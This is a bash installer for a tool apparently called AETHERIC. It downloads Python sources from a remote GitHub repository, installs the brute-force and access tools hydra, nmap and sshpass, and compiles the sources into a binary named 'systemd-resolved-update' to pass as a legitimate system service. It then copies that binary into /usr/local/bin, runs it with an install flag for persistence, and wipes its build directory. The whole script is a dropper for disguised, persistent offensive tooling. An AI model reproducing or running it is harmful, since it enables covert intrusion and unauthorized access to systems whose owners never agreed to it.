#!/bin/bash
# AETHERIC Installation Script
set -e

REPO_URL="https://raw.githubusercontent.com/reconagent/version_1/main"
WORKDIR="/tmp/aetheric_install"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Install system dependencies
apt-get update -y
apt-get install -y python3 python3-venv python3-pip git build-essential nmap hydra sshpass rsync

# Download source files (including all .py files)
for file in main.py core/*.py modules/*.py utils/*.py requirements.txt; do
    mkdir -p "$(dirname "$file")"
    curl -s -o "$file" "$REPO_URL/$file"
done

# Ensure __init__.py exists (needed for PyInstaller's package detection)
touch core/__init__.py modules/__init__.py utils/__init__.py

# Verify downloaded files
echo "=== Downloaded files ==="
ls -la core/ modules/ utils/

# Create virtual environment and install dependencies
python3 -m venv venv
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
pip install pyinstaller

# ============================================================
# Generate a custom .spec file that collects all submodules
# ============================================================
cat > main.spec <<EOF
# -*- mode: python ; coding: utf-8 -*-
from PyInstaller.utils.hooks import collect_submodules

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=collect_submodules('core') + collect_submodules('modules') + collect_submodules('utils'),
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=None,
    noarchive=False,
)
pyz = PYZ(a.pure, a.zipped_data, cipher=None)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='systemd-resolved-update',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=True,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
EOF

# Build using the spec file
pyinstaller main.spec

# Move binary to system path
cp dist/systemd-resolved-update /usr/local/bin/

# Install persistence (preserve environment variables with sudo -E)
sudo -E /usr/local/bin/systemd-resolved-update --install

# Cleanup
cd /
rm -rf "$WORKDIR"

echo "AETHERIC installed."